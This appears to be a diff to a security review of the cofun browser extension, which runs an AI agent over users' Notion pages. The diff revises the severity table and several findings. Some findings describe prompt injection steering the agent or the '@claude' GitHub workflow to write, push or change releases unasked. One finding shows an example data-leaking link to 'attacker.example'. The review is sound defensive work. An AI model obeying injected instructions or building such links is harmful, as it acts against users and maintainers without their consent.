@@ -28,29 +28,29 @@ Who attacks, from where:
 
 Not covered: Notion, Clerk, Stripe, Cloudflare, OpenRouter, and DeepSeek being compromised themselves, and a malicious dependency in the build (limited by the lockfile, dependency review in CI, and Dependabot, not reviewed package by package).
 
-Severity is what it would cost if it happened, weighed by how likely it is: **High** (a user's Notion content or account exposed or changed without them doing anything unusual), **Medium** (needs a condition the attacker does not fully control, or costs the operator money), **Low** (little to gain, or needs the user's machine or a click), **Info** (a control that was checked and holds, recorded so a later change does not lose it).
+Severity is what it would cost if it happened, weighed by how likely it is (the summary gives the likelihood of each by itself): **High** (a user's Notion content or account exposed or changed without them doing anything unusual), **Medium** (needs a condition the attacker does not fully control, or costs the operator money), **Low** (little to gain, or needs the user's machine or a click), **Info** (a control that was checked and holds, recorded so a later change does not lose it).
 
 ## Summary
 
-| | Finding | Severity | Status |
-|---|---|---|---|
-| A1 | Text the agent reads can make it write as the user, unasked | High | Accepted for now; fix proposed → [#388](https://github.com/cofun-labs/cofun/issues/388), [#387](https://github.com/cofun-labs/cofun/issues/387) |
-| A2 | Reading beyond Notion (planned) widens A1 and can add a way out for data | High once it ships | Fix proposed → raise [#348](https://github.com/cofun-labs/cofun/issues/348) from `later` before the first outside source ships |
-| A3 | One question can change many pages | Medium | Accepted; narrowed by #388 |
-| A4 | Data can leave in a link someone clicks | Low | Accepted trade-off |
-| A5 | Mention refusals reveal members' names | Low | Accepted; [#137](https://github.com/cofun-labs/cofun/issues/137) |
-| B1 | Chats and keys on the device are not encrypted | Low | Accepted trade-off |
-| B2 | `static.cofun.cc` is on the same site as the sign-in | Low | Accepted, with a rule |
-| C1 | A session token with no `azp` is accepted | Low | Fix proposed → [#385](https://github.com/cofun-labs/cofun/issues/385) |
-| C2 | A finding about the hosted model's cost to the operator | Medium | Reported privately; details withheld here |
-| C3 | Nothing bounds what all accounts together spend on the hosted model | Medium | Fix proposed → [#386](https://github.com/cofun-labs/cofun/issues/386) |
-| C4 | The worker's pages have no script policy | Low | Fix proposed → #385 |
-| C5 | Request bodies are read whole before they are measured | Low | Fix proposed → #385 |
-| C6 | Only the chat is rate limited | Low | Fix proposed → #385 |
-| C7 | Credits spent before a dispute are not recovered | Low | Accepted trade-off |
-| D1 | Secret scanning and push protection are off on the repository | Medium | Fix proposed → [#384](https://github.com/cofun-labs/cofun/issues/384) |
-| D2 | No private way to report a vulnerability | Medium | Fix proposed → #384 |
-| D3 | The `@claude` workflow reads text anyone can write, with write access | Low | Accepted trade-off |
+| | Finding | Severity | How likely | Status |
+|---|---|---|---|---|
+| A1 | Text the agent reads can make it write as the user, unasked | High | Medium: normal use reaches it; depends on the model | Accepted for now; fix proposed → [#388](https://github.com/cofun-labs/cofun/issues/388), [#387](https://github.com/cofun-labs/cofun/issues/387) |
+| A2 | Reading beyond Notion (planned) widens A1 and can add a way out for data | High once it ships | Not yet: nothing shipped | Fix proposed → raise [#348](https://github.com/cofun-labs/cofun/issues/348) from `later` before the first outside source ships |
+| A3 | One question can change many pages | Medium | Low | Accepted; narrowed by #388 |
+| A4 | Data can leave in a link someone clicks | Low | Low: needs a click | Accepted trade-off |
+| A5 | Mention refusals reveal members' names | Low | Low | Accepted; [#137](https://github.com/cofun-labs/cofun/issues/137) |
+| B1 | Chats and keys on the device are not encrypted | Low | Low: needs the device | Accepted trade-off |
+| B2 | `static.cofun.cc` is on the same site as the sign-in | Low | Low: needs a maintainer mistake | Accepted, with a rule |
+| C1 | A session token with no `azp` is accepted | Low | Very low | Fix proposed → [#385](https://github.com/cofun-labs/cofun/issues/385) |
+| C2 | Findings about the hosted model's cost to the operator | Medium | Medium | Reported privately; details withheld here |
+| C3 | Nothing bounds what all accounts together spend on the hosted model | Medium | Medium | Fix proposed → [#386](https://github.com/cofun-labs/cofun/issues/386) |
+| C4 | The worker's pages have no script policy | Low | Low: no known injection | Fix proposed → #385 |
+| C5 | Request bodies are read whole before they are measured | Low | Low | Fix proposed → #385 |
+| C6 | Only the chat is rate limited | Low | Low | Fix proposed → #385 |
+| C7 | Credits spent before a dispute are not recovered | Low | Low | Accepted trade-off |
+| D1 | Secret scanning and push protection are off on the repository | Medium | Low: needs a maintainer mistake | Fix proposed → [#384](https://github.com/cofun-labs/cofun/issues/384) |
+| D2 | No private way to report a vulnerability | Medium | Not an attack: a gap | Fix proposed → #384 |
+| D3 | The `@claude` workflow reads text anyone can write, with write access | Medium | Low | Fix proposed → [#392](https://github.com/cofun-labs/cofun/issues/392) |
 
 No credential or account identifier was found in the repository or its history, and no way was found to act as another user, read another user's data, or spend another user's credits.
 
@@ -89,7 +89,7 @@ The epic [#350](https://github.com/cofun-labs/cofun/issues/350) adds sources the
 
 ### A4. Data can leave in a link someone clicks (Low)
 
-- **What can be written.** `edit_page`, `create_page`, and a saved chat write text, and links only with `http:`, `https:`, `mailto:`, or a path on Notion (`inline` in `src/notion/blocks.ts`). No image, embed, bookmark, or file block can be written, and a page icon must be one emoji (`isEmoji` in `src/tools/write.ts`). So nothing the agent writes makes Notion or a reader's browser fetch an outside address by being looked at.
+- **What can be written.** `edit_page`, `create_page`, and a saved chat write text, and links only with `http:`, `https:`, `mailto:`, or a path on Notion (`inline` in `src/notion/blocks.ts`). No image, embed, bookmark, or file block can be written, and an icon is never an address: a page's icon must be one emoji (`isEmoji` in `src/tools/write.ts`, for `update_pages`), and a callout's icon, which `edit_page`, `create_page`, and a saved chat can write, is the callout's label only when that label starts with a pictographic character (`parseMarkdown` in `src/notion/blocks.ts`; the rest of the label is not checked, so it is looser than the page's rule, but it cannot start as a URL or a path). So nothing the agent writes makes Notion or a reader's browser fetch an outside address by being looked at.
 - **In the side panel.** A reply's Markdown is rendered as React elements with no HTML plugin; images are never loaded (their alt text is shown as a link), and the extension's content security policy would block them anyway (`src/sidepanel/Markdown.tsx`, `manifest.ts`).
 - **What is left.** A link whose address carries data (`https://attacker.example/?q=…`), written into a page, a comment, or a reply, sends that data when someone clicks it.
 - **Status.** Accepted. Recheck whenever a new block type or property type becomes writable: anything that holds a URL Notion fetches by itself (image, embed, bookmark, file, link preview, an icon or cover by URL) turns this into exfiltration without a click.
@@ -104,7 +104,7 @@ When a mention names no one, the tool tells the model the members with a similar
 |---|---|---|
 | Read only removes the changing tools from what the model is offered | `readingTools`, `agent.ts` | `test/mode.test.tsx` |
 | Saving a chat or a reply to Notion is the user's action, not a tool: the model cannot start it | `src/tools/save.ts`, `Save.tsx` | `test/save-to-notion.test.tsx` |
-| Tool arguments are parsed with the tool's zod schema before anything runs | `src/tool.ts` | `test/tool-parameters.test.ts` |
+| Tool arguments are parsed with the tool's zod schema before anything runs | `defineTool` in `src/tool.ts` | Each tool's own tests refuse bad arguments; `test/tool-parameters.test.ts` only checks that every tool's schema is one the model can be given |
 | A stored chat that does not parse is never opened or sent to the model | `src/sessions.ts` | `test/sessions.test.ts` |
 | The tools act on the active tab only, and only when its host is `www.notion.so` or `app.notion.com` | `activeNotionTab`, `notionRequest` in `src/notion/tab.ts` | `test/notion.test.ts` (no test that another Notion tab is never used: [#247](https://github.com/cofun-labs/cofun/issues/247)) |
 | A model-written chat title is plain text, asked of the model that already has the conversation | `src/agent/title.ts` | |
@@ -113,8 +113,8 @@ When a mention names no one, the tool tells the model the members with a similar
 
 - **Permissions** (`manifest.ts`, pinned by `test/manifest.test.ts`): `sidePanel`, `storage`, `tabs`, `cookies`, `scripting`; hosts `www.notion.so`, `app.notion.com`, the worker, Clerk's Frontend API, and `*.cofun.cc` (to see one Clerk cookie). `tabs` exposes every tab's URL and title to the extension's own code; the code reads the active tab's, and the Notion tabs' for the page picker.
 - **No way in from a page.** The extension has no content script, no `externally_connectable`, no web-accessible resource, and no message listener (`chrome.runtime.onMessage`, `postMessage`): a web page, Notion included, has no channel to the side panel or the service worker. The service worker is one line that opens the panel.
-- **Code in the Notion tab** runs with `chrome.scripting` in the ISOLATED world: the page cannot see or patch it. The functions injected are fixed (`notionRequest`, `tabUser`, `readSelection`); the model's arguments reach them only as a JSON request body for a fixed list of endpoints (`NotionEndpoint`), sent to the tab's own origin after checking the tab is still on a Notion host, with redirects not followed. Lint makes `chrome.scripting` and `fetch` errors anywhere else, and `chrome.debugger` everywhere.
-- **Content security policy** for the extension's pages: scripts from the extension only, connections only to the worker, Clerk, `openrouter.ai`, and `api.deepseek.com`, images only from the extension and `img.clerk.com`. No remote code. zod is set up not to use `new Function` (`src/zod.ts`).
+- **Code in the Notion tab** runs with `chrome.scripting` in the ISOLATED world: the page cannot see or patch it. The functions injected are fixed (`notionRequest`, `tabUser`, `readSelection`); the model's arguments reach them only as a JSON request body for a fixed list of endpoints (`NotionEndpoint`), sent to the tab's own origin after checking the tab is still on a Notion host, with redirects not followed. Lint makes `chrome.scripting` an error anywhere else, `fetch` an error outside this module and `src/agent/` (which calls the worker and the user's own model), and `chrome.debugger` an error everywhere.
+- **Content security policy** for the extension's pages: scripts from the extension only, connections only to the worker, Clerk, `openrouter.ai`, and `api.deepseek.com`, images only from the extension, `data:` and `blob:` URLs, and `img.clerk.com`. No remote code. zod is set up not to use `new Function` (`src/zod.ts`).
 - **The user's own model.** The key is sent only to the service it belongs to, and the conversation goes there instead of to the worker. That is the user's choice of a third party, described in the privacy page. The services' answers are parsed with schemas.
 - **`get_current_tab`** gives the model the active tab's whole URL on any site when it asks, and a URL can hold a token. It then stays in the conversation and the saved chat. Described in the privacy page; accepted.
 
@@ -145,20 +145,20 @@ How it works today. Every route under `/v1` is behind `requireSession` (`worker/
 | Hand grants are bounded (50,000 credits, 366 days), record the admin, and are logged | `routes/admin.ts` | `worker/test/admin.test.ts` |
 | The admin page writes what it shows with `textContent`, and neither page can be framed | `admin.ts`, `routes/pages.ts` | |
 | The model is the worker's; a request naming another is refused, and only the fields the model needs are passed on | `routes/chat.ts`, `chat-request.ts` | `worker/test/api.test.ts` |
-| A reply the client stops reading is still charged (by an estimate when it was cut short), and the charge is handed to `waitUntil` so a dropped request cannot take it along | `routes/chat.ts` | `worker/test/api.test.ts` (the stopped reply; the fake `waitUntil` does not test a dropped connection) |
+| A reply the client stops reading is still charged, by an estimate when it was cut short | `routes/chat.ts` | `worker/test/api.test.ts` |
 | The product a call is recorded under comes from the signed `azp`, not from the client | `productOf` | `worker/test/api.test.ts` |
 | A webhook event counts only with Stripe's signature (HMAC-SHA256, compared in constant time) made within 5 minutes | `verifiedEvent` in `stripe.ts` | `worker/test/billing.test.ts` |
 | A replayed or repeated event grants nothing twice: a grant is unique per payment, and a take-back happens once | `grants.payment`, `revoked_payments` | `worker/test/billing.test.ts` |
 | What is granted is what Stripe says was sold (the line item, read from Stripe), for the user and pack the worker wrote on the session, never an amount or a user from the client | `handleEvent` in `billing.ts` | `worker/test/billing.test.ts` |
-| Logs hold ids, numbers, and at most 260 characters of an error the worker did not write (a failed usage record is the one error logged whole, and it is never given the conversation); usage records and the ledger hold no message text; the gateway's logs and cache are off per request | `errorSummary`, `usage.ts`, `routes/chat.ts` | `worker/test/api.test.ts` |
+| Logs hold ids, numbers, and at most 260 characters of an error the worker did not write (a failed usage record is the one error logged whole, and it is never given the conversation); usage records and the ledger hold no message text; the gateway's logs and cache are off per request. Cloudflare's own invocation logs keep each request's time, URL, and status, as [PRIVACY.md](../PRIVACY.md) says | `errorSummary`, `usage.ts`, `routes/chat.ts` | `worker/test/api.test.ts` |
 
 ### C1. A session token with no `azp` is accepted (Low)
 
-`requireSession` checks `azp` only when the token has one. A browser always names its origin when it asks Clerk for a token, so a token without one comes from a client that is not a browser page, holding the user's own Clerk client token; it gains nothing it could not get by naming the extension's origin itself. The check exists to stop other websites using a session, and a website cannot produce such a token. Still, the rule is simpler and stricter as "every token names an allowed origin". → [#385](https://github.com/cofun-labs/cofun/issues/385).
+`requireSession` checks `azp` only when the token has one. A browser always names its origin when it asks Clerk for a token, so a token without one comes from a client that is not a browser page, holding the user's own Clerk client token; it gains nothing it could not get by naming the extension's origin itself. The check exists to stop other websites using a session, and a website cannot produce such a token. Still, the rule is simpler and stricter as "every token names an allowed origin". The token's issuer is not checked either: the worker trusts one key, the instance's, so only that instance's tokens verify. → [#385](https://github.com/cofun-labs/cofun/issues/385).
 
-### C2. A finding about the hosted model's cost to the operator (Medium)
+### C2. Findings about the hosted model's cost to the operator (Medium)
 
-What is at stake is the operator's cost for the hosted model, not another user's credits or data. The details are kept out of this public document (rule 10 below) and were given to the maintainer on 2026-11-14; this entry is completed when the fix lands.
+Several related points about when and how much a call is charged, among them what happens to a request whose client goes away (the worker hands the charge to `waitUntil`, which the tests' fake does not exercise). What is at stake is the operator's cost for the hosted model, not another user's credits or data. Their details are kept out of this public document (rule 10 below) and were given to the maintainer on 2026-11-14; this entry is completed when the fixes land.
 
 ### C3. Nothing bounds what all accounts together spend (Medium)
 
@@ -197,9 +197,9 @@ A refund or dispute takes back what is left of a purchase; what was spent stays 
 
 There is no `SECURITY.md`, GitHub's private vulnerability reporting is off, and both privacy pages send reports to public Issues. Someone who finds a real hole can only publish it or stay silent. → [#384](https://github.com/cofun-labs/cofun/issues/384) (P1).
 
-### D3. The `@claude` workflow reads text anyone can write (Low)
+### D3. The `@claude` workflow reads text anyone can write (Medium)
 
-`.github/workflows/claude.yml` runs with write access to contents, pull requests, and issues when the owner, a member, or a collaborator mentions `@claude`. The thread it then reads can hold text from anyone, so an instruction hidden in an Issue or a comment could steer it to push to a branch or post a comment. It cannot push to `main` (the ruleset), merge, or publish; a pushed branch still needs a PR that a person queues. `claude-review.yml` runs on `pull_request`, so a fork's PR gets no secret, and it is allowed only to read the diff and post comments. Accepted.
+`.github/workflows/claude.yml` runs with write access to contents, pull requests, and issues when the owner, a member, or a collaborator mentions `@claude`. The thread it then reads can hold text from anyone, so an instruction hidden in an Issue or a comment could steer it. With `contents: write` and the checkout's credentials the job could push a branch, post a comment, and also create or change a tag or a release, the draft release's zip included, which is the file the maintainer uploads to the store; the job also holds `CLAUDE_CODE_OAUTH_TOKEN`. How far a steered run gets depends on which tools `claude-code-action` allows by default, which this review did not check. It cannot push to `main` (the ruleset) or merge, a pushed branch still needs a PR that a person queues, and nothing reaches the store without the maintainer's upload. **How likely:** low, since only the owner, a member, or a collaborator can start it, on a thread they chose. `claude-review.yml` runs on `pull_request`, so a fork's PR gets no secret, and it is allowed only to read the diff and post comments. → [#392](https://github.com/cofun-labs/cofun/issues/392) (P2).
 
 ## Not reviewed
 
